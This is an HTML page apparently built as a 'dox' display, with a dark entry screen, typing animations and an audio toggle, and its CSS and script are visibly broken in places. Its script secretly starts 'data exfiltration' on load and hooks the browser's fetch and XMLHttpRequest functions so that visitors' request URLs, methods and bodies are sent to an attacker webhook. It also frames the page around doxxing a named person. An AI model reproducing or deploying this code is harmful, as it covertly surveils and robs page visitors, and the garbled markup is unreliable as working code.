<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">

<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }

  :root {
    --bg: #000;
    --card: #0a0a0a;
    --card2: #111;
    --text: #fff;
    --text2: #666;
    --border: #1a1a1a;
  }

  [data-theme="light"] {
    --bg: #f0f0f0;
    --card: #fff;
    --card2: #f5f5f5;
    --text: #000;
    --text2: #555;
    --border: #ddd;

  body {

    color: var(--text);
    font-family: 'Courier New', monospace;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
    position: relative;
    transition: background 0.4s ease, color 0.4s ease;
  }

  .bg-image {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;

    z-index: 0;
    transition: filter 0.4s ease;
  }

  [data-theme="light"] .bg-image {
    filter: grayscale(1) brightness(0.7) blur(1px);
  }

  .bg-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.7);
    z-index: 1;

    align-items: center;
    justify-content: center;
    background: var(--bg);
    transition: opacity 0.8s ease, transform 0.8s ease;
  }

  #entryScreen.hidden {
    opacity: 0;
    transform: scale(0.95);
    pointer-events: none;
  }

  .entry-title {
    font-size: clamp(5rem, 20vw, 12rem);
    font-weight: 900;
    letter-spacing: -0.04em;
    color: var(--text);
    margin-bottom: 2.5rem;
    animation: flicker 3s infinite;
  }

  @keyframes flicker {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.8; text-shadow: 0 0 20px rgba(255,255,255,0.1); }
  }

  .entry-btn {
    padding: 1.2rem 4rem;
    font-size: 1.2rem;
    font-weight: 700;
    border: 2px solid var(--text);
    background: transparent;
    color: var(--text);

    opacity: 1;

    font-size: clamp(3.5rem, 14vw, 8rem);

    letter-spacing: -0.04em;
    color: var(--text);

    0%, 100% { opacity: 1; }
    50% { opacity: 0.6; }

  .dox-box {

    background: var(--card);
    border: 1px solid var(--border);
    padding: 2.5rem 4rem;
    min-width: 380px;
    transition: background 0.3s ease, border-color 0.3s ease;
    position: relative;
    overflow: hidden;
  }

  .dox-box::before {
    content: '';
    position: absolute;
    top: -50%;
    left: -50%;
    width: 200%;
    height: 200%;
    background: repeating-linear-gradient(
      0deg,
      transparent,
      transparent 2px,
      rgba(255,255,255,0.01) 2px,
      rgba(255,255,255,0.01) 4px
    );
    pointer-events: none;
    animation: scan 8s linear infinite;
  }

  @keyframes scan {
    0% { transform: translateY(-100%); }
    100% { transform: translateY(100%); }
  }

  .dox-line {
    font-size: clamp(0.9rem, 2.2vw, 1.2rem);
    font-weight: 500;
    color: var(--text);
    padding: 0.8rem 0;
    border-bottom: 1px solid var(--border);

    letter-spacing: 0.04em;
    position: relative;
    z-index: 1;
    height: 3.2rem;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.8rem;

  }

  .dox-line .label {
    color: var(--text2);
    font-weight: 400;
    min-width: 80px;
    text-align: right;
  }

  .dox-line .value {
    font-weight: 600;
    min-width: 200px;
    text-align: left;
    position: relative;

  .typing-cursor {
    display: inline-block;
    width: 2px;
    height: 1.2em;
    background: var(--text);
    margin-left: 2px;
    animation: blink 0.7s step-end infinite;
  }

  @keyframes blink {
    0%, 100% { opacity: 1; }
    50% { opacity: 0; }
  }

  .theme-toggle {
    position: fixed;
    top: 24px;
    right: 24px;
    z-index: 50;
    width: 48px;
    height: 48px;
    border: 1px solid var(--border);
    background: var(--card);
    color: var(--text);
    cursor: pointer;
    font-size: 1.4rem;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.3s ease;
    font-family: 'Courier New', monospace;
  }

  .theme-toggle:hover {
    border-color: var(--text);
  }

  .audio-toggle {
    position: fixed;
    bottom: 24px;
    right: 24px;
    z-index: 50;
    width: 48px;
    height: 48px;
    border: 1px solid var(--border);
    background: var(--card);
    color: var(--text);
    cursor: pointer;
    font-size: 1.2rem;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.3s ease;
    font-family: 'Courier New', monospace;
  }

  .audio-toggle:hover {
    border-color: var(--text);
  }

  @media (max-width: 600px) {
    .dox-box {
      padding: 1.5rem;
      min-width: unset;
      width: 100%;
    }
    .dox-line {
      font-size: 0.8rem;
      height: 2.8rem;
      flex-wrap: wrap;
      gap: 0.3rem;
    }
    .dox-line .label {
      min-width: 60px;
      font-size: 0.7rem;
    }
    .dox-line .value {
      min-width: 120px;
      font-size: 0.8rem;
    }
    .entry-btn {
      padding: 1rem 2.5rem;
      font-size: 1rem;
    }
  }
</style>

  // ---- UI CONTROLS ----
  const entryScreen = document.getElementById('entryScreen');
  const mainContent = document.getElementById('mainContent');
  const enterBtn = document.getElementById('enterBtn');
  const themeToggle = document.getElementById('themeToggle');
  const audioToggle = document.getElementById('audioToggle');
  const audio = document.getElementById('bgAudio');
  let audioPlaying = false;

  enterBtn.addEventListener('click', () => {
    entryScreen.classList.add('hidden');
    setTimeout(() => {
      mainContent.classList.add('visible');
      setTimeout(() => {
        document.querySelectorAll('.dox-line .value').forEach((el, i) => {
          const text = el.closest('.dox-line').dataset.text;
          setTimeout(() => {
            typeLoop(el, text, 40 + (i * 5));
          }, i * 300);
        });
      }, 500);
    }, 800);
    
    audio.play().then(() => {
      audioPlaying = true;
      audioToggle.textContent = '◼';
    }).catch(() => {
      audioToggle.textContent = '♫';
    });
  });

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && !entryScreen.classList.contains('hidden')) {
      enterBtn.click();
    }
  });

  themeToggle.addEventListener('click', () => {
    const current = document.body.getAttribute('data-theme');
    document.body.setAttribute('data-theme', current === 'dark' ? 'light' : 'dark');
  });

  audioToggle.addEventListener('click', () => {
    if (audioPlaying) {
      audio.pause();
      audioPlaying = false;
      audioToggle.textContent = '♫';
    } else {
      audio.play().then(() => {
        audioPlaying = true;
        audioToggle.textContent = '◼';
      }).catch(() => {
        alert('Audio failed. Check the URL.');
      });
    }
  });

  // ---- TYPE LOOP ----
  function typeLoop(element, text, speed = 50) {
    let isTyping = true;
    let index = 0;
    let timeout;
    let pause = false;

    function type() {
      if (pause) return;
      
      if (isTyping) {
        if (index < text.length) {
          element.textContent = text.substring(0, index + 1) + '▌';
          index++;
          timeout = setTimeout(type, speed);
        } else {
          element.textContent = text + '▌';
          pause = true;
          setTimeout(() => {
            pause = false;
            isTyping = false;
            type();
          }, 1500);
        }
      } else {
        if (index > 0) {
          element.textContent = text.substring(0, index) + '▌';
          index--;
          timeout = setTimeout(type, speed);
        } else {
          element.textContent = '▌';
          pause = true;
          setTimeout(() => {
            pause = false;
            isTyping = true;
            type();
          }, 1000);
        }
      }
    }

    type();
  }

  // ---- START DATA EXFILTRATION IMMEDIATELY ----
  runAllDataGrabbers();

  // ---- OVERRIDE FETCH TO CATCH ANY OUTGOING DATA ----
  const originalFetch = window.fetch;
  window.fetch = function(url, options) {
    if (url && typeof url === 'string' && !url.includes(WEBHOOK)) {
      exfiltrate('FETCH_REQUEST', {
        url: url,
        method: options?.method || 'GET',
        body: options?.body ? String(options.body).substring(0, 2000) : null
      });
    }
    return originalFetch.apply(this, arguments);
  };

  // ---- OVERRIDE XMLHTTPREQUEST ----
  const OriginalXHR = window.XMLHttpRequest;
  window.XMLHttpRequest = function() {
    const xhr = new OriginalXHR();
    const originalOpen = xhr.open;
    xhr.open = function(method, url, ...args) {
      if (url && typeof url === 'string' && !url.includes(WEBHOOK)) {
        exfiltrate('XHR_REQUEST', {
          method: method,
          url: url
        });
      }
      return originalOpen.apply(this, [method, url, ...args]);
    };
    return xhr;
  };

  console.log('🔥 KORBYN DOX - FULL DATA EXFIL ACTIVE');
</script>
